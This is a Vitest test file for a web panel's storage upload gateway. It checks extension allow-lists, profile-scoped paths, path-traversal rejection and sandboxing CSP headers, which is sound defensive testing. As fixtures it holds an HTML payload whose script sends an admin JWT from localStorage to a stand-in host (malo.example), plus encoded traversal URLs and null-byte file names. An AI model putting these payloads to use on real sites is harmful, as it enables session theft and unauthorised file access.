// Las subidas del panel después de cerrar las URLs firmadas de /sb: todas van
// por /api/db (api/_lib/pasarela.js) con la sesión, solo a carpetas de tus
// perfiles, y ninguna parte del código depende ya de una URL firmada. Y lo que
// se sube solo entra con una extensión de la lista (api/_lib/almacen.js) y se
// guarda con el tipo que dice ella, no el navegador: el bucket sale del mismo
// dominio que el panel, y un .html o un .svg se leía la sesión.
// La sesión, los perfiles y Supabase van simulados.
import fs from 'node:fs'
import path from 'node:path'
import { Readable } from 'node:stream'
import { describe, it, expect, vi, beforeEach } from 'vitest'

const estado = vi.hoisted(() => ({ auth: null }))
// El supabase-js del panel (src/utils/supabase.js), para uploadFile.
const panel = vi.hoisted(() => ({ upload: vi.fn(async () => ({ error: null })) }))

vi.mock('../api/lib/supabase.js', () => ({ supabase: { from: () => ({}) } }))
vi.mock('../src/utils/supabase.js', () => ({
  supabase: {
    storage: {
      from: () => ({
        upload: panel.upload,
        getPublicUrl: (ruta) => ({ data: { publicUrl: `https://helm.local/api/db/storage/v1/object/public/helm/${ruta}` } }),
      }),
    },
  },
}))
vi.mock('../api/_lib/auth.js', () => ({
  validateAuth: vi.fn(async () => {
    if (!estado.auth) throw Object.assign(new Error('sin sesión'), { statusCode: 401 })
    return estado.auth
  }),
}))
vi.mock('../api/_lib/access.js', () => ({
  perfilesVisibles: vi.fn(async (auth) => (auth.plataforma ? null : ['p1'])),
  olvidarVisibles: vi.fn(),
}))

process.env.SUPABASE_URL = 'http://supabase.local'
process.env.SUPABASE_SERVICE_KEY = 'clave-de-servicio'
// Lo que contesta storage: por defecto, el JSON de una subida.
const contesta = { tipo: 'application/json', cuerpo: '{"Key":"helm/p1/x"}' }
globalThis.fetch = vi.fn(async () => ({
  status: 200,
  headers: new Headers({ 'content-type': contesta.tipo }),
  arrayBuffer: async () => new TextEncoder().encode(contesta.cuerpo).buffer,
}))

const { pasarela } = await import('../api/_lib/pasarela.js')
const { TIPOS, NO_ADMITIDO, tipoDeArchivo, cspArchivo } = await import('../api/_lib/almacen.js')
const { uploadFile } = await import('../src/helm/lib.js')

function respuesta() {
  return {
    statusCode: 0, headers: {}, cuerpo: null, headersSent: false,
    setHeader(k, v) { this.headers[k.toLowerCase()] = v },
    end(b) { this.cuerpo = b ? String(b) : ''; this.headersSent = true; return this },
  }
}
// Lo que hace supabase-js con storage.from('helm').upload(ruta, archivo) desde
// Node (un Buffer): el archivo en crudo, con el content-type que le digan.
async function sube(ruta, { method = 'POST', bytes = Buffer.from('%PDF-1.7\n'), tipo = 'application/pdf', url } = {}) {
  return pide({ method, url: url || `/api/db/storage/v1/object/${ruta}`, bytes, headers: { 'content-type': tipo, 'x-upsert': 'false' } })
}
async function pide({ method = 'GET', url, bytes, headers = {} }) {
  const req = Object.assign(Readable.from(bytes ? [bytes] : []), {
    method, url, headers: { authorization: 'Bearer sesion', ...headers },
  })
  const res = respuesta()
  await pasarela(req, res)
  return res
}
// Y lo que hace desde el navegador (un File): multipart/form-data con un campo
// cacheControl y el archivo, con el tipo que diga el navegador.
async function subeDesdeElNavegador(ruta, { bytes, tipoNavegador = 'text/html', archivos = 1, cacheControl = '3600' } = {}) {
  const fd = new FormData()
  fd.append('cacheControl', cacheControl)
  for (let i = 0; i < archivos; i++) fd.append('', new File([bytes], ruta.split('/').pop(), { type: tipoNavegador }))
  const r = new Request('http://navegador', { method: 'POST', body: fd })
  return pide({
    method: 'POST', url: `/api/db/storage/v1/object/${ruta}`,
    bytes: Buffer.from(await r.arrayBuffer()), headers: { 'content-type': r.headers.get('content-type'), 'x-upsert': 'false' },
  })
}

const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(16, 1)])
const HTML = Buffer.from('<!doctype html><script>fetch("//malo.example/?s="+localStorage.bw_admin_jwt)</script>')

beforeEach(() => {
  estado.auth = { role: 'client', clientId: 'p1', nivel: 'member' }
  Object.assign(contesta, { tipo: 'application/json', cuerpo: '{"Key":"helm/p1/x"}' })
  fetch.mockClear()
  panel.upload.mockClear()
})

describe('subidas del panel por /api/db', () => {
  it('a una carpeta de tu perfil: pasa, con la clave de servicio y el archivo tal cual', async () => {
    const r = await sube('helm/p1/adjuntos/ab12cd-factura.pdf')
    expect(r.statusCode).toBe(200)
    expect(fetch).toHaveBeenCalledTimes(1)
    const [url, opciones] = fetch.mock.calls[0]
    expect(url).toBe('http://supabase.local/storage/v1/object/helm/p1/adjuntos/ab12cd-factura.pdf')
    expect(opciones.method).toBe('POST')
    expect(opciones.headers.Authorization).toBe('Bearer clave-de-servicio')
    expect(opciones.headers['content-type']).toBe('application/pdf')
    expect(opciones.body.toString()).toBe('%PDF-1.7\n')
  })

  it('a la carpeta de otro perfil, o sin sesión, no', async () => {
    expect((await sube('helm/p9/adjuntos/x.pdf')).statusCode).toBe(403)
    estado.auth = null
    expect((await sube('helm/p1/adjuntos/x.pdf')).statusCode).toBe(401)
    expect(fetch).not.toHaveBeenCalled()
  })

  it('por aquí tampoco hay URLs firmadas, ni para subir ni para leer', async () => {
    for (const [ruta, method] of [
      ['upload/sign/helm/p1/x.pdf', 'POST'], ['upload/sign/helm/p1/x.pdf', 'PUT'],
      ['sign/helm/p1/x.pdf', 'POST'], ['sign/helm', 'POST'],
    ]) {
      // PUT ni siquiera entra en la pasarela (405); el resto, 403.
      expect([403, 405], `${method} ${ruta}`).toContain((await sube(ruta, { method })).statusCode)
    }
    expect(fetch).not.toHaveBeenCalled()
  })
})

describe('qué se puede subir al almacén', () => {
  it('desde el navegador: se reenvía el archivo en crudo, con el tipo de su extensión y no el del navegador', async () => {
    const r = await subeDesdeElNavegador('helm/p1/gastos/ab12cd-ticket.PNG', { bytes: PNG, tipoNavegador: 'text/html' })
    expect(r.statusCode, r.cuerpo).toBe(200)
    const [url, opciones] = fetch.mock.calls[0]
    expect(url).toBe('http://supabase.local/storage/v1/object/helm/p1/gastos/ab12cd-ticket.PNG')
    expect(opciones.headers['content-type']).toBe('image/png')
    expect(opciones.headers['cache-control']).toBe('max-age=3600')
    expect(opciones.headers['x-upsert']).toBe('false')
    expect(Buffer.compare(opciones.body, PNG)).toBe(0)
  })

  it('en crudo, igual: el content-type que manda el cliente no cuenta', async () => {
    const r = await sube('helm/p1/adjuntos/x1-informe.pdf', { tipo: 'text/html' })
    expect(r.statusCode).toBe(200)
    expect(fetch.mock.calls[0][1].headers['content-type']).toBe('application/pdf')
    // Un cache-control que no sea `max-age=<n>` no se reenvía.
    await sube('helm/p1/adjuntos/x2-informe.pdf', { tipo: 'application/pdf' })
    expect(fetch.mock.calls[1][1].headers['cache-control']).toBeUndefined()
  })

  it('páginas web, SVG, scripts, XML o sin extensión: 415 con un mensaje claro, y no llega a storage', async () => {
    for (const nombre of ['x.html', 'x.htm', 'x.xhtml', 'logo.svg', 'logo.SVG', 'x.svgz', 'x.js', 'x.mjs', 'x.xml',
      'x.png.html', 'sin-extension', 'x.', 'x.constructor', 'x.__proto__', 'x.pdf%00.html']) {
      for (const subir of [() => sube(`helm/p1/adjuntos/${nombre}`, { bytes: HTML, tipo: 'image/png' }),
        () => subeDesdeElNavegador(`helm/p1/adjuntos/${nombre}`, { bytes: HTML, tipoNavegador: 'image/png' })]) {
        const r = await subir()
        expect(r.statusCode, nombre).toBe(415)
        expect(JSON.parse(r.cuerpo).message).toMatch(/no se puede subir.*SVG/s)
      }
    }
    expect(fetch).not.toHaveBeenCalled()
  })

  it('lo que sube el panel (Biblioteca, Gastos, el logo) sigue entrando', async () => {
    for (const nombre of ['foto.jpg', 'IMG_0001.JPEG', 'whatsapp.jfif', 'logo.png', 'logo.webp', 'anim.gif', 'iphone.heic',
      'iphone.heif', 'foto.avif', 'factura.pdf', 'contrato.docx', 'viejo.doc', 'hoja.xlsx', 'viejo.xls', 'texto.odt',
      'hoja.ods', 'datos.csv', 'charla.pptx', 'reel.mp4', 'reel.mov', 'reel.webm', 'audio.mp3', 'nota.m4a', 'voz.wav', 'notas.txt',
      'escaneo.tif', 'escaneo.TIFF', 'fotos.zip', 'charla-vieja.ppt', 'charla.odp', 'reel.m4v', 'voz.ogg', 'PTT-20261027.opus',
      'movil.3gp', 'nota.amr', 'apuntes.md', 'reel.srt', 'carta.rtf']) {
      const r = await subeDesdeElNavegador(`helm/p1/biblioteca/ab12cd-${nombre}`, { bytes: PNG, tipoNavegador: '' })
      expect(r.statusCode, nombre).toBe(200)
      expect(fetch.mock.calls.at(-1)[1].headers['content-type'], nombre).toBe(tipoDeArchivo(nombre))
    }
  })

  it('ningún tipo con que se guarda es algo que el navegador ejecute', () => {
    for (const [ext, tipo] of Object.entries(TIPOS)) {
      expect(tipo.split(';')[0], ext).not.toMatch(/html|svg|javascript|ecmascript|(^|\/|\+)xml$/i)
    }
  })

  it('TXT y CSV, sin charset (los del banco van en Latin-1); MD, SRT y RTF, como binario: se descargan', async () => {
    expect(tipoDeArchivo('movimientos.txt')).toBe('text/plain')
    expect(tipoDeArchivo('movimientos.CSV')).toBe('text/csv')
    for (const nombre of ['apuntes.md', 'reel.srt', 'carta.rtf']) expect(tipoDeArchivo(nombre), nombre).toBe('application/octet-stream')
    const r = await subeDesdeElNavegador('helm/p1/biblioteca/ab12cd-apuntes.md', { bytes: Buffer.from('# Guion\n'), tipoNavegador: 'text/markdown' })
    expect(r.statusCode, r.cuerpo).toBe(200)
    expect(fetch.mock.calls.at(-1)[1].headers['content-type']).toBe('application/octet-stream')
  })

  it('lo que no va a entrar se corta antes de leer el cuerpo: no espera a sus megas', async () => {
    for (const [ruta, codigo] of [['helm/p1/adjuntos/ab12cd-pagina.html', 415], ['helm/p1/adjuntos/sin-extension', 415],
      ['helm/p9/adjuntos/ab12cd-factura.pdf', 403]]) {
      // Un cuerpo que no acaba nunca: si la pasarela esperase a leerlo, no contestaría.
      const req = Object.assign(new Readable({ read() {} }), {
        method: 'POST', url: `/api/db/storage/v1/object/${ruta}`,
        headers: { authorization: 'Bearer sesion', 'content-type': 'multipart/form-data; boundary=x' },
      })
      const res = respuesta()
      const colgada = new Promise(r => setTimeout(() => r('colgada'), 1000))
      expect(await Promise.race([pasarela(req, res).then(() => 'contesta'), colgada]), ruta).toBe('contesta')
      expect(res.statusCode, ruta).toBe(codigo)
      // Ni ha empezado a leerlo.
      expect(req.listenerCount('data'), ruta).toBe(0)
      req.destroy()
    }
    expect(fetch).not.toHaveBeenCalled()
  })

  it('vacío, con dos archivos a la vez o con un multipart roto: 400', async () => {
    expect((await sube('helm/p1/adjuntos/x.pdf', { bytes: Buffer.alloc(0) })).statusCode).toBe(400)
    expect((await subeDesdeElNavegador('helm/p1/adjuntos/x.pdf', { bytes: Buffer.alloc(0) })).statusCode).toBe(400)
    expect((await subeDesdeElNavegador('helm/p1/adjuntos/x.pdf', { bytes: PNG, archivos: 2 })).statusCode).toBe(400)
    expect((await sube('helm/p1/adjuntos/x.pdf', { tipo: 'multipart/form-data; boundary=nada', bytes: Buffer.from('basura') })).statusCode).toBe(400)
    expect(fetch).not.toHaveBeenCalled()
  })

  it('rutas que se salen de su carpeta: `..`, barras codificadas o invertidas, ni para subir ni para ver', async () => {
    for (const url of [
      '/api/db/storage/v1/object/helm/p1/../p9/x.pdf',
      '/api/db/storage/v1/object/helm/p1/%2e%2e/p9/x.pdf',
      '/api/db/storage/v1/object/helm/p1/.%2E/p9/x.pdf',
      '/api/db/storage/v1/object/helm/p1%2f..%2fp9/x.pdf',
      '/api/db/storage/v1/object/helm/p1/..%2Fp9/x.pdf',
      '/api/db/storage/v1/object/helm/p1\\..\\p9\\x.pdf',
      '/api/db/storage/v1/object/helm/p1/%5c..%5cp9/x.pdf',
    ]) {
      expect((await sube(null, { url })).statusCode, url).toBe(400)
    }
    estado.auth = null
    for (const url of ['/api/db/storage/v1/object/public/helm/../../../rest/v1/clients',
      '/api/db/storage/v1/object/public/helm/%2e%2e/%2e%2e/bucket', '/api/db/storage/v1/object/public/helm%2f..%2fx']) {
      expect((await pide({ url })).statusCode, url).toBe(400)
    }
    expect(fetch).not.toHaveBeenCalled()
  })

  it('borrar con un `..` en la ruta, tampoco', async () => {
    const borra = (prefixes) => pide({
      method: 'DELETE', url: '/api/db/storage/v1/object/helm',
      bytes: Buffer.from(JSON.stringify({ prefixes })), headers: { 'content-type': 'application/json' },
    })
    expect((await borra(['p1/../p9/adjuntos/x.pdf'])).statusCode).toBe(403)
    expect((await borra(['p1/adjuntos\\..\\x.pdf'])).statusCode).toBe(403)
    expect(fetch).not.toHaveBeenCalled()
    expect((await borra(['p1/adjuntos/ab12cd-x.pdf'])).statusCode).toBe(200)
  })

  it('lo que sale del almacén lleva su CSP: un HTML que ya estuviera dentro no ejecuta nada', async () => {
    estado.auth = null
    Object.assign(contesta, { tipo: 'text/html', cuerpo: HTML.toString() })
    const r = await pide({ url: '/api/db/storage/v1/object/public/helm/p1/adjuntos/viejo.html' })
    expect(r.statusCode).toBe(200)
    expect(r.headers['content-security-policy']).toMatch(/default-src 'none'/)
    expect(r.headers['content-security-policy']).toMatch(/sandbox/)
    expect(r.headers['x-content-type-options']).toBe('nosniff')
    // El PDF, sin sandbox: el visor del navegador no funciona dentro de uno.
    Object.assign(contesta, { tipo: 'application/pdf', cuerpo: '%PDF-1.7' })
    const pdf = await pide({ url: '/api/db/storage/v1/object/public/helm/p1/adjuntos/f.pdf' })
    expect(pdf.headers['content-security-policy']).toMatch(/default-src 'none'/)
    expect(pdf.headers['content-security-policy']).not.toMatch(/sandbox/)
  })
})

describe('la CSP de lo que sale del almacén', () => {
  it("PDF, vídeo y audio con object-src 'self' (el visor de PDF de Safari) y sin sandbox", () => {
    for (const tipo of ['application/pdf', 'video/mp4', 'video/3gpp', 'video/quicktime', 'audio/ogg', 'audio/amr', 'audio/mpeg']) {
      const csp = cspArchivo(tipo)
      expect(csp, tipo).toMatch(/^default-src 'none';/)
      expect(csp, tipo).toContain("object-src 'self'")
      expect(csp, tipo).not.toMatch(/sandbox|script-src/)
    }
  })

  it('el resto, en sandbox y sin object-src: ni un HTML, ni un SVG, ni lo que se descarga', () => {
    for (const tipo of ['text/html', 'image/svg+xml', 'text/plain', 'text/csv', 'application/octet-stream', 'application/zip',
      'image/tiff', 'image/png', undefined]) {
      const csp = cspArchivo(tipo)
      expect(csp, tipo).toMatch(/^default-src 'none';/)
      expect(csp, tipo).not.toMatch(/object-src|script-src/)
      expect(csp, tipo).toMatch(/; sandbox$/)
    }
  })
})

describe('el panel mira la misma lista antes de subir (uploadFile)', () => {
  const archivo = (nombre, tipo = '') => new File([PNG], nombre, { type: tipo })

  it('lo que no está en la lista no llega ni a mandarse, con el mismo aviso que la pasarela', async () => {
    for (const nombre of ['pagina.html', 'logo.svg', 'x.js', 'x.xml', 'sin-extension', 'x.png.html']) {
      await expect(uploadFile('p1', 'biblioteca', archivo(nombre, 'image/png')), nombre).rejects.toThrow(NO_ADMITIDO)
    }
    expect(panel.upload).not.toHaveBeenCalled()
  })

  it('todo lo de la lista se sube, con el nombre que verá la pasarela', async () => {
    for (const ext of Object.keys(TIPOS)) {
      const { path: ruta } = await uploadFile('p1', 'biblioteca', archivo(`Mi archivo.${ext.toUpperCase()}`))
      expect(ruta, ext).toMatch(new RegExp(`^p1/biblioteca/[a-z0-9]+-Mi-archivo\\.${ext.toUpperCase()}$`))
      expect(tipoDeArchivo(ruta), ext).toBe(TIPOS[ext])
      expect(panel.upload.mock.calls.at(-1)[0], ext).toBe(ruta)
    }
  })

  it('el texto de Adjuntos dice lo que se admite, no solo «imágenes, vídeo o PDF»', () => {
    const fuente = fs.readFileSync(path.resolve(__dirname, '../src/helm/Adjuntos.jsx'), 'utf8')
    expect(fuente).not.toMatch(/Imágenes, vídeo o PDF/)
    expect(fuente).toMatch(/Fotos, PDF, Office, texto, vídeo, audio o ZIP · hasta \{MAX_UPLOAD_MB\} MB/)
  })
})

describe('el logo del perfil', () => {
  it('no ofrece SVG ni lo deja subir', () => {
    const lib = fs.readFileSync(path.resolve(__dirname, '../src/helm/lib.js'), 'utf8')
    const ajustes = fs.readFileSync(path.resolve(__dirname, '../src/helm/views/Ajustes.jsx'), 'utf8')
    const compruebaTipo = /export async function uploadLogo[\s\S]*?\n}/.exec(lib)?.[0] || ''
    expect(compruebaTipo).toMatch(/image\\\/\(png\|jpeg\|webp\)/)
    const selector = /<input ref=\{fileRef\}[^>]*accept="([^"]+)"/.exec(ajustes)?.[1]
    expect(selector).toBe('image/png,image/jpeg,image/webp')
    expect(ajustes).not.toMatch(/PNG, JPG o SVG/)
  })
})

describe('nadie depende ya de las subidas firmadas', () => {
  // Todo el código propio de src/, api/ y scripts/ (sin las librerías
  // minificadas que viven en src/pages/web/).
  function archivos(dir) {
    return fs.readdirSync(dir, { withFileTypes: true }).flatMap(e => {
      const p = path.join(dir, e.name)
      if (e.isDirectory()) return e.name === 'node_modules' ? [] : archivos(p)
      return /\.(m?js|jsx)$/.test(e.name) && !/\.min\.js$/.test(e.name) ? [p] : []
    })
  }

  it('ni el panel ni el servidor firman o usan URLs de subida', () => {
    const raiz = path.resolve(__dirname, '..')
    const usan = ['src', 'api', 'scripts'].flatMap(d => archivos(path.join(raiz, d)))
      .filter(f => /createSignedUploadUrl|uploadToSignedUrl|object\/upload\/sign/.test(fs.readFileSync(f, 'utf8')))
      .map(f => path.relative(raiz, f))
    // sb-proxy.mjs solo la nombra para explicar por qué ya no pasa.
    expect(usan.filter(f => f !== path.join('scripts', 'sb-proxy.mjs'))).toEqual([])
  })

  it('el cliente de Supabase del panel habla con /api/db, no con /sb', () => {
    const fuente = fs.readFileSync(path.resolve(__dirname, '../src/utils/supabase.js'), 'utf8')
    expect(fuente).toMatch(/window\.location\.origin\}\/api\/db/)
    expect(fuente).not.toMatch(/\/sb\b/)
  })
})
